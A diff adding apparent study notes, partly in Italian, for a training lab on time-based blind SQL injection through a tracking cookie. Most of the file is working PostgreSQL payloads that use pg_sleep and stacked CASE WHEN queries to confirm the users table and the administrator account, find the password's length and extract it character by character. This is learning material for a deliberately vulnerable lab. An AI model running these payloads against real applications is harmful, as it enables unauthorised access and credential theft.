@@ -1,0 +1,62 @@
+This lab contains a blind SQL injection vulnerability.
+The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.
+
+The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error.
+However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.
+
+The database contains a different table called users, with columns called username and password.
+You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.
+
+To solve the lab, log in as the administrator user.
+
+
+QUERY 
+
+SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX';
+
+
+
+1) DETERMINARE PRESENZA VULNERABILITA' BLIND SQLI TIME DELAY 
+
+
+SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX';
+' || pg_sleep(10)--
+= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX' || pg_sleep(10)--';
+
+
+2) CONFERMARE PRESENZA TABELLA users
+
+SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX'
+' ; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX' ; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--'  ===>>>  delay funziona
+
+
+SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX'
+' ; SELECT CASE WHEN (1=0) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX' ; SELECT CASE WHEN (1=0) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--'  ===>>> delay non funziona
+
+
+3) CONFERMARE PRESENZA username administrator
+
+SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX'
+' ; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX' ; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--'  ===>>> delay funziona
+
+
+SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX'
+' ; SELECT CASE WHEN (username='nonexistant') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX' ; SELECT CASE WHEN (username='nonexistant') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--'  ===>>> delay non funziona
+
+
+4) DETERMINARE LUNGHEZZA password administrator
+
+SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX'
+' ; SELECT CASE WHEN (username='administrator') AND LENGTH(password)>20 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX' ; SELECT CASE WHEN (username='administrator') AND LENGTH(password)>20 THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--'  ===>>> no delay, quindi password ha 20 caratteri o meno
+
+
+5) ENUMERARE CARATTERI password administrator
+
+SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX'
+' ;SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--
+= SELECT TrackingId FROM TrackingTable WHERE TrackingId = 'XXX' ;SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--'  ===>>> delay quando carattere è giusto
